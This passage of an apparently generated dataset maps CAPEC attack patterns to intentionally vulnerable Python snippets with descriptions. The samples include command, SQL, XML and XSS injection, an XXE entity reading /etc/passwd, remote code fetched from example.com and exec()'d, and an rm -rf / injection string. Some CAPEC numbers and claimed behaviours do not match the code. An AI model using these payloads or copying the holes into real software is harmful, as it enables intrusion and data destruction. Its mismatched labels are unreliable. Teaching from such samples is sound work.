        "code_snippet": "import os\nimport signal\n\n# CWE-828: Signal handler with functionality that is not asynchronous-safe\ndef unsafe_signal_handler(signum, frame):\n    global privileged_data\n    # CWE-391: Unchecked Error Condition\n    try:\n        privileged_data = os.getenv('PRIVILEGED_DATA')\n    except Exception as e:\n        pass  # Error is ignored\n\n# Register the unsafe signal handler\nsignal.signal(signal.SIGUSR1, unsafe_signal_handler)\n\n# Simulate privileged operation\nprivileged_data = 'Sensitive Information'\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Simulate a signal being sent to the process, which could be hijacked\nos.kill(os.getpid(), signal.SIGUSR1)\n\n# CWE-782: Exposed IOCTL with Insufficient Access Control\n# Simulate an IOCTL operation that should be restricted\nif privileged_data == 'Sensitive Information':\n    print('Access granted to privileged operation')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a deprecated attack pattern related to catching exceptions or signals from a privileged block, now referred to CAPEC-30: Hijacking a Privileged Thread of Execution. The code includes several CWE weaknesses:\n\n1. CWE-828: The signal handler `unsafe_signal_handler` is not asynchronous-safe and can be interrupted, leading to potential race conditions.\n2. CWE-391: The signal handler contains an unchecked error condition where exceptions are ignored, allowing unexpected behavior to go unnoticed.\n3. CWE-294: The code simulates an authentication bypass by sending a signal to the process, which could be hijacked by an attacker to replay privileged operations.\n4. CWE-782: The code simulates an IOCTL operation that should be restricted but does not enforce proper access control, allowing unauthorized access to privileged operations.\n\nThe main idea is to show how an attacker could exploit signal handling and unchecked errors to hijack a privileged thread of execution and gain unauthorized access to sensitive operations."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "import ctypes\n\n# Unsafe C code that can be called from Python\nc_code = \"\"\"\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid unsafe_function() {\n    printf(\"Executing unsafe C code\\n\");\n    system(\"/bin/sh\");  // This can be exploited to execute arbitrary commands\n}\n\"\"\"\n\n# Write the C code to a file\nwith open('unsafe_code.c', 'w') as f:\n    f.write(c_code)\n\n# Compile the C code into a shared library\nimport os\nos.system('gcc -shared -o unsafe_code.so -fPIC unsafe_code.c')\n\n# Load the shared library\nunsafe_lib = ctypes.CDLL('./unsafe_code.so')\n\n# Call the unsafe function\nunsafe_lib.unsafe_function()",
        "description": "This Python code snippet demonstrates how an attacker can escape a sandbox by calling unsafe C code from Python. The Python script writes a C program to a file, which includes a function that executes a shell command. The C code is then compiled into a shared library, which is loaded and executed using Python's ctypes library. This example embodies the CAPEC idea of escaping a sandbox by calling code in another language, specifically highlighting the CWE-111 (Direct Use of Unsafe JNI) and CWE-693 (Protection Mechanism Failure) weaknesses. The C code execution represents a potential security risk, as it can perform unsafe operations that are not allowed in the sandboxed environment."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import os\nfrom urllib.parse import urlparse\n\ndef is_authorized(user, url):\n    # CWE-551: Authorization before parsing and canonicalization\n    if user != 'admin':\n        return False\n    parsed_url = urlparse(url)\n    # CWE-424: Improper Protection of Alternate Path\n    if parsed_url.path.startswith('/admin'): \n        return True\n    return False\n\n# CWE-657: Violation of Secure Design Principles\n# CWE-670: Always-Incorrect Control Flow Implementation\n# CWE-1107: Insufficient Isolation of Symbolic Constant Definitions\n\n# Example usage\nuser = 'guest'\nurl = 'http://example.com/admin/../public'\n\nif is_authorized(user, url):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerability where authorization checks are performed before URL parsing and canonicalization (CWE-551). The `is_authorized` function checks if a user is 'admin' before parsing the URL, which can lead to bypassing authorization by manipulating the URL (CWE-424). The code also violates secure design principles (CWE-657) by not properly handling URL paths and has an incorrect control flow implementation (CWE-670) as it does not correctly reflect the intended authorization logic. Additionally, the symbolic constant 'admin' is not isolated (CWE-1107), making the code less maintainable and secure."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import hashlib\n\n# Simulated client-side authentication\nclass Client:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = hashlib.sha256(password.encode()).hexdigest()\n\n    def authenticate(self):\n        # Client-side check (vulnerable)\n        if self.username == 'admin' and self.password == hashlib.sha256('adminpass'.encode()).hexdigest():\n            return True\n        return False\n\n# Simulated server-side functionality\nclass Server:\n    def __init__(self):\n        self.data = 'Sensitive Data'\n\n    def get_data(self, client):\n        # Server relies on client-side authentication (vulnerable)\n        if client.authenticate():\n            return self.data\n        else:\n            return 'Access Denied'\n\n# Example usage\nclient = Client('admin', 'adminpass')\nserver = Server()\nprint(server.get_data(client))  # Outputs: Sensitive Data\n\n# Malicious client bypassing authentication\nmalicious_client = Client('admin', 'wrongpass')\nmalicious_client.authenticate = lambda: True  # Bypassing client-side check\nprint(server.get_data(malicious_client))  # Outputs: Sensitive Data",
        "description": "This Python code snippet demonstrates a vulnerable implementation of client-side authentication, which is a common issue described in CWE-603 (Use of Client-Side Authentication). The `Client` class performs authentication checks on the client side, and the `Server` class relies on these checks to grant access to sensitive data. This setup is vulnerable because an attacker can modify the client to bypass the authentication check, as shown with the `malicious_client` example. This embodies the main idea of the deprecated CAPEC pattern, highlighting the risks of relying on client-side mechanisms for security."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n\ndef main():\n    user_input = input('Enter the file name to read: ')\n    # Vulnerable to Resource Injection\n    file_content = read_file(user_input)\n    print(file_content)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a vulnerability to Resource Injection (CAPEC-99) by improperly handling user input for a file path. The `read_file` function attempts to open and read a file specified by the user without validating the input. This can lead to unintended file access, including sensitive system files. The code does not restrict or validate the input, making it susceptible to CWE-99 (Improper Control of Resource Identifiers), CWE-1285 (Improper Validation of Specified Index, Position, or Offset in Input), and CWE-20 (Improper Input Validation). An attacker could exploit this by providing a path to a critical system file, leading to potential security breaches."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes user input as code\n\ndef execute_user_code(user_input):\n    # CWE-477: Use of obsolete function 'execfile' (Python 2.x)\n    execfile(user_input)\n\n# Example usage\nuser_input = 'user_script.py'  # This should be validated and sanitized\nexecute_user_code(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable function that executes user-provided input as code, embodying the main idea of CAPEC-242: Code Injection. The function 'execute_user_code' takes 'user_input' and uses the deprecated 'execfile' function (CWE-477: Use of Obsolete Function) to execute the content of the file specified by 'user_input'. This represents a severe security risk as it allows an attacker to execute arbitrary code. The code also highlights the importance of validating and sanitizing user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n    command = f'echo {user_input}'\n    os.system(command)\n\n# CWE-94: Improper Control of Generation of Code ('Code Injection')\nuser_input = input('Enter your name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a code injection vulnerability. The function `execute_command` takes user input and constructs a shell command using that input. The command is then executed using `os.system`. The user input is not properly sanitized, allowing an attacker to inject arbitrary commands. For example, if the user inputs `John; rm -rf /`, the constructed command would be `echo John; rm -rf /`, which would execute the `rm -rf /` command, potentially causing significant damage. This snippet embodies the main idea of CAPEC-94 (Code Injection) and highlights CWE-77 (Command Injection) by showing how improper neutralization of special elements can lead to code execution vulnerabilities."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable code: directly embedding user input into HTML attributes without proper sanitization\n    html_content = f'<a href=\"#\" style=\"color:red\" onmouseover=\"alert(\\'{query}\\')\">Hover over me</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to XSS attacks targeting HTML attributes. The application takes a user input from the query parameter and directly embeds it into an HTML attribute (onmouseover) without proper sanitization. This can lead to the execution of malicious scripts when a user hovers over the link, representing the main idea of CAPEC-86. The related CWEs highlight the improper neutralization of script in attributes (CWE-83), especially in IMG tags (CWE-82), and the general issue of improper input neutralization leading to XSS (CWE-79, CWE-80)."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable code: directly embedding user input into HTML without proper sanitization\n    html_content = f'<a href=\"javascript:alert(\\'{query}\\')\">Click me</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks targeting URI placeholders. The application has a single route '/search' that takes a query parameter 'q' from the URL. The user input is directly embedded into an anchor tag's href attribute without proper sanitization or neutralization. This allows an attacker to inject a malicious URI, such as 'javascript:alert('XSS')', which will be executed when the victim clicks on the link. This example embodies the main idea of the CAPEC by showing how improper neutralization of user input in URI placeholders can lead to XSS vulnerabilities. The related CWEs provide additional context on the types of improper neutralizations that can occur, such as in script attributes, IMG tags, and encoded URI schemes."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to doubled character XSS attack\n    return render_template_string(f'<h1>Search Results for: {query}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to a Cross-Site Scripting (XSS) attack using doubled characters. The application has a single route '/search' that takes a query parameter 'q' from the URL. The query parameter is then directly embedded into the HTML response without proper sanitization or validation. This makes the application susceptible to XSS attacks, especially those using doubled characters to bypass basic input filters. For example, an attacker could use '<<script>alert(1)</script>' as the query parameter to execute a script on the victim's browser. This snippet embodies the main idea of CAPEC-85 and related CWEs by demonstrating improper input neutralization and validation, leading to a potential XSS vulnerability."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # Vulnerable to XSS due to improper neutralization of script in IMG tag attributes\n    response = f'<img src=\"{user_input}\" />'\n    return render_template_string(response)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks. The vulnerability arises from improper neutralization of user-controlled input within the 'src' attribute of an HTML IMG tag. The 'submit' route accepts user input via a POST request and directly embeds it into an IMG tag without proper sanitization. This can be exploited by an attacker to inject malicious scripts. The code embodies the main idea of the deprecated CAPEC-174, which is now covered by CAPEC-174: Flash Parameter Injection and CAPEC-591: Stored XSS, and highlights related CWEs such as CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page)."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Improper neutralization of invalid characters\n    if '\\x00' in query or '\\r' in query or '\\n' in query or '\\t' in query:\n        query = query.split('\\x00')[0].split('\\r')[0].split('\\n')[0].split('\\t')[0]\n    # Vulnerable to XSS\n    return render_template_string('<h1>Search Results for: {}</h1>'.format(query))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to XSS attacks due to improper neutralization of invalid characters in user input. The application has a search endpoint that takes a 'query' parameter from the URL. The code attempts to filter out invalid characters like null, carriage return, line feed, and tab by splitting the query string at these characters. However, this filtering is insufficient and can be bypassed, allowing an attacker to inject malicious scripts. The query is then directly rendered in an HTML template without proper escaping, making the application susceptible to XSS attacks. This example embodies the main idea of CAPEC-86 and related CWEs by showing how improper handling of invalid characters and lack of proper output encoding can lead to security vulnerabilities."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a command injection vulnerability. The function `execute_command` takes user input and constructs an OS command string using that input. The command is then executed using `os.system()`. If the user input is not properly sanitized, an attacker can inject malicious commands. For example, if the user inputs `; rm -rf /`, it would result in the execution of `ls ; rm -rf /`, potentially causing significant damage. This snippet embodies the main idea of CAPEC-88 and related CWEs, highlighting the risks of improper neutralization of special elements in command strings."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes a command based on user input\ndef execute_command(user_input):\n    # CWE-77: Command Injection vulnerability\n    command = f'echo {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter a command: ')\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates a command injection vulnerability (CWE-77) by constructing an OS command using user input without proper neutralization of special elements. The `execute_command` function takes user input and directly incorporates it into a shell command using `os.system`. This allows an attacker to inject arbitrary commands, potentially compromising the system. The code embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how improper handling of user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulated user input\nuser_input = \"<user><name>admin</name><password>' or '1'='1</password></user>\"\n\n# Parse the XML input\ntry:\n    root = ET.fromstring(user_input)\n    username = root.find('name').text\n    password = root.find('password').text\n\n    # Simulated XML database query\n    query = f\"//users/user[name='{username}' and password='{password}']\"\n    print(f\"Executing query: {query}\")\n\n    # Simulated database response\n    if username == 'admin' and password == \"' or '1'='1\":\n        print(\"Authentication bypassed! Admin access granted.\")\n    else:\n        print(\"Access denied.\")\nexcept ET.ParseError as e:\n    print(f\"Error parsing XML: {e}\")",
        "description": "This Python code snippet demonstrates an XML Injection vulnerability. The code simulates user input that includes an XML structure with a potential injection payload. The user input is parsed using the xml.etree.ElementTree module, and an XPath query is constructed using the parsed data. The query is then executed, and based on the input, it can bypass authentication checks. This example highlights the risks of not properly neutralizing user-controllable input in XML processing, leading to unauthorized access and potential data manipulation."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import os\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-1108: Excessive Reliance on Global Variables\n\n# Global variable to store the path of the file to be included\nfile_path = '/tmp/malicious_code.py'\n\n# Function to include and execute code from a local file\n# This is vulnerable to Local Code Inclusion attacks\n# An attacker can place a malicious file at the specified path\n# and it will be executed by this function\n\ndef include_local_code():\n    global file_path\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as file:\n            code = file.read()\n            exec(code)  # CWE-506: Embedded Malicious Code\n    else:\n        print('File does not exist')\n\n# Simulate the inclusion of local code\ninclude_local_code()",
        "description": "This Python code snippet demonstrates a Local Code Inclusion vulnerability. The function `include_local_code` reads and executes code from a file located at `/tmp/malicious_code.py`. This is dangerous because an attacker can place a malicious file at this location, which will then be executed by the application. The code also relies on a global variable `file_path` (CWE-1108) and does not properly control dynamically-managed code resources (CWE-913). The use of `exec` to run the code from the file can lead to the execution of embedded malicious code (CWE-506). This snippet embodies the main idea of the CAPEC by showing how an attacker can force an application to load and execute arbitrary code files from the local machine."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import os\n\n# Vulnerable function to include a local file\n\ndef include_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            exec(file.read())\n    except FileNotFoundError:\n        print('File not found')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Simulating user input for file path\nuser_input = input('Enter the path of the file to include: ')\n\n# Vulnerable inclusion of the file based on user input\ninclude_file(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerability similar to PHP Local File Inclusion (LFI). The function `include_file` takes a file path as input and attempts to read and execute the file's contents using `exec()`. This is analogous to PHP's `include` or `require` functions. The user is prompted to provide the file path, which is then passed to the `include_file` function. This code is vulnerable because it does not validate or sanitize the user input, allowing an attacker to specify any local file path, potentially leading to the execution of malicious code. This example embodies the main idea of CAPEC-829, CAPEC-98, and related CWEs by demonstrating the risks of including functionality from an untrusted control sphere and improper control of filenames for inclusion."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a Remote Code Inclusion vulnerability. It downloads a Python script from a remote URL without performing any integrity checks (CWE-494). The downloaded code is then executed using the `exec` function, which includes functionality from an untrusted source (CWE-829). This can lead to the execution of malicious code, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Vulnerable SOAP request with DTD injection\nsoap_message = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:SomeRequest>\n         <web:input><![CDATA[\n            <!DOCTYPE foo [\n               <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n            ]>\n            <foo>&xxe;</foo>\n         ]]></web:input>\n      </web:SomeRequest>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Send the SOAP request\nresponse = requests.post('http://example.com/webservices', data=soap_message, headers={'Content-Type': 'text/xml'})\n\n# Parse the response\nroot = etree.fromstring(response.content)\nprint(etree.tostring(root, pretty_print=True).decode())",
        "description": "This Python code snippet demonstrates a SOAP request that includes a DTD injection vulnerability. The SOAP message contains a Document Type Definition (DTD) that defines an external entity 'xxe' which references the local file '/etc/passwd'. When the SOAP message is processed by a vulnerable server, it will attempt to include the contents of '/etc/passwd' in the response. This represents CWE-827 (Improper Control of Document Type Definition) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs). The code sends the SOAP request to a web service and prints the response, potentially exposing sensitive information from the server."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import struct\nimport socket\n\ndef handle_soap_request(data):\n    # Extract the length of the array from the SOAP request\n    array_length = struct.unpack('I', data[:4])[0]\n    \n    # Allocate buffer based on the specified length\n    buffer = bytearray(array_length * 4)\n    \n    # Copy the data into the buffer without checking the actual length\n    for i in range(array_length):\n        buffer[i*4:(i+1)*4] = data[4 + i*4: 4 + (i+1)*4]\n    \n    # Process the buffer (dummy processing)\n    print(\"Processing buffer:\", buffer)\n\n# Simulate receiving a SOAP request with an understated length\nfake_soap_request = struct.pack('I', 2) + b'A' * 20  # Length is 2, but actual data is 20 bytes\nhandle_soap_request(fake_soap_request)",
        "description": "This Python code snippet demonstrates a SOAP Array Overflow vulnerability. The `handle_soap_request` function processes a SOAP request by extracting the length of an array from the first 4 bytes of the request. It then allocates a buffer based on this length and copies the data into the buffer without verifying the actual length of the data. This can lead to a buffer overflow if the actual data length exceeds the specified length. The `fake_soap_request` simulates a SOAP request where the length is understated, causing the buffer overflow when processed."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# CWE-287: Authentication Bypass Issues\nclass User:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n# CWE-493: Failure to provide confidentiality for stored data\nusers = [User('admin', 'admin123'), User('user', 'user123')]\n\n# CWE-766: Failure to Protect Stored Data from Modification\ntransaction_data = {'user': 'admin', 'amount': 1000}\n\n# Vulnerable code: Logging sensitive information\nlogging.debug(f\"Transaction data: {transaction_data}\")\n\n# Vulnerable code: Authentication bypass\ndef authenticate(username, password):\n    for user in users:\n        if user.username == username and user.password == password:\n            return True\n    return False\n\n# Simulate an authentication bypass\nif authenticate('admin', 'wrongpassword'):\n    print(\"Authenticated\")\nelse:\n    print(\"Authentication failed\")",
        "description": "This Python code snippet demonstrates several deprecated weaknesses related to the CAPEC 'Abuse of Transaction Data Structure'. The code includes logging sensitive transaction data (CWE-532), which can expose information through log files. It also shows a simple authentication mechanism that can be bypassed (CWE-287). Additionally, it fails to provide confidentiality for stored user data (CWE-493) and does not protect transaction data from modification (CWE-766). The code logs sensitive transaction data and attempts to authenticate a user with incorrect credentials, highlighting potential vulnerabilities."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.authenticated = False\n\n    def authenticate(self, username, password):\n        # Send credentials to server (insecurely)\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(f'{username}:{password}'.encode())\n            response = s.recv(1024).decode()\n            if response == 'OK':\n                self.authenticated = True\n\n    def send_data(self, data):\n        if not self.authenticated:\n            raise Exception('Client not authenticated')\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(data.encode())\n\n# Example usage\nclient = Client('127.0.0.1', 8080)\nclient.authenticate('user', 'pass')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The client sends credentials to the server in plain text over a socket connection. If the server responds with 'OK', the client considers itself authenticated and proceeds to send data. This setup is vulnerable to several issues: \n1. **CAPEC-65: Sniff Application Code** - An attacker can sniff the network traffic to capture the credentials and data being sent.\n2. **CWE-294: Authentication Bypass by Capture-replay** - An attacker can capture the authentication message and replay it to gain unauthorized access.\n3. **CWE-603: Use of Client-Side Authentication** - The authentication logic is implemented on the client side, making it easy to bypass by modifying the client code.\n\nThe code represents the main idea of the CAPEC by showing how insecure client-side authentication can lead to vulnerabilities that attackers can exploit by sniffing and replaying network traffic."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.authenticated = False\n\n    def authenticate(self, username, password):\n        # Authentication is done on the client side\n        if username == 'admin' and password == 'password':\n            self.authenticated = True\n        else:\n            self.authenticated = False\n\n    def send_data(self, data):\n        if not self.authenticated:\n            print('Authentication required')\n            return\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(data.encode())\n            response = s.recv(1024)\n            print('Received', repr(response))\n\n# Example usage\nclient = Client('127.0.0.1', 65432)\nclient.authenticate('admin', 'password')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class performs authentication on the client side, which can be easily bypassed by modifying the client code. This is related to CWE-603 (Use of Client-Side Authentication). The `send_data` method sends data to a server only if the client is authenticated. However, since the authentication is done on the client side, an attacker can modify the client to bypass this check and send data without proper authentication. This represents the main idea of the deprecated CAPEC, where an attacker can sniff and capture application code or data during transmission, exploiting weak client-side authentication mechanisms."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import socket\n\n# Vulnerable server code that sends sensitive data without encryption\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(1)\n\nprint('Server is listening on port 12345...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    # Sending sensitive data without encryption\n    sensitive_data = 'Sensitive Information: Password123'\n    client_socket.send(sensitive_data.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that sends sensitive data (e.g., a password) to a client without any encryption. This embodies the main idea of CAPEC-65, where an attacker can sniff and capture application code or sensitive data during its initial distribution. The related CWE-294 (Authentication Bypass by Capture-replay) is relevant here because the lack of encryption allows an attacker to capture and potentially replay the sensitive data. The code also indirectly touches on CWE-603 (Use of Client-Side Authentication) as it assumes the client is trusted without server-side verification. This example highlights the importance of using encryption to protect sensitive data during transmission."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Create a table\ncursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')\nconn.commit()\n\n# Function to fetch user data based on username\n# This function is vulnerable to SQL Injection\n# CWE-89: Improper Neutralization of Special Elements used in an SQL Command\n# CWE-943: Improper Neutralization of Special Elements in Data Query Logic\n# CWE-202: Exposure of Sensitive Information Through Data Queries\n# CWE-209: Generation of Error Message Containing Sensitive Information\n# CWE-20: Improper Input Validation\ndef get_user_data(username):\n    try:\n        query = f\"SELECT * FROM users WHERE username = '{username}'\"\n        cursor.execute(query)\n        result = cursor.fetchall()\n        return result\n    except sqlite3.Error as e:\n        # CWE-209: Generation of Error Message Containing Sensitive Information\n        return f\"An error occurred: {e}\"\n\n# Example usage\n# An attacker might use a fuzzing technique to send unexpected input\n# to extract sensitive information\nuser_input = \"' OR '1'='1\"  # This input is crafted to exploit SQL Injection vulnerability\nuser_data = get_user_data(user_input)\nprint(user_data)\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a vulnerable function that fetches user data from a SQLite database based on a provided username. The function `get_user_data` constructs an SQL query using unsanitized user input, making it susceptible to SQL Injection (CWE-89, CWE-943). An attacker can exploit this by providing specially crafted input, such as `\"' OR '1'='1\"`, to manipulate the query logic and retrieve all user data. Additionally, the error handling in the function exposes sensitive information (CWE-209) if an error occurs. This code embodies the main idea of the CAPEC by showing how an adversary can send modified queries to extract sensitive information beyond what is intended, leveraging improper input validation (CWE-20) and exposure of sensitive information through data queries (CWE-202)."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef process_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('File does not exist')\n\n    # CWE-646: Reliance on file extension\n    if not file_path.endswith('.txt'):\n        raise ValueError('Unsupported file type')\n\n    with open(file_path, 'r') as file:\n        data = file.read()\n        # Simulate processing the file\n        print('Processing file content:', data)\n\n# CWE-377: Insecure Temporary File\ntemp_file = tempfile.NamedTemporaryFile(delete=False)\ntry:\n    temp_file.write(b'corrupted content')\n    temp_file.close()\n\n    # CWE-434: Unrestricted upload of dangerous file type\n    process_file(temp_file.name)\nfinally:\n    os.remove(temp_file.name)\n",
        "description": "This Python code snippet demonstrates a scenario where an application processes a file that could be corrupted by an attacker, leading to potential vulnerabilities. The `process_file` function checks if the file exists and relies on the file extension to determine if it is a supported type (CWE-646). It then reads and processes the file content. A temporary file is created insecurely (CWE-377) and written with corrupted content. The `process_file` function is called with this temporary file, simulating the processing of a potentially dangerous file type (CWE-434). This represents the main idea of the CAPEC 'Force Use of Corrupted Files', where an attacker could force the application to use a corrupted file, leading to various security issues."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import os\n\ndef execute_command():\n    # CWE-1108: Excessive Reliance on Global Variables\n    global command\n    command = os.getenv('USER_COMMAND')\n    if command:\n        # CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n        eval(command)\n\n# CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\ncommand = ''\nexecute_command()",
        "description": "This Python code snippet demonstrates a vulnerable pattern related to environment variable manipulation and several related CWEs. The `execute_command` function retrieves a command from an environment variable `USER_COMMAND` and executes it using `eval()`. This is a direct example of CWE-95, where user input is not properly sanitized before being evaluated, leading to potential code injection vulnerabilities. The use of a global variable `command` exemplifies CWE-1108, as it relies excessively on global state. Additionally, the variable `command` is declared with unnecessarily wide scope (CWE-1126), as it is only used within the `execute_command` function. This code snippet highlights the risks associated with improper handling of environment variables and the importance of scope and input validation."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
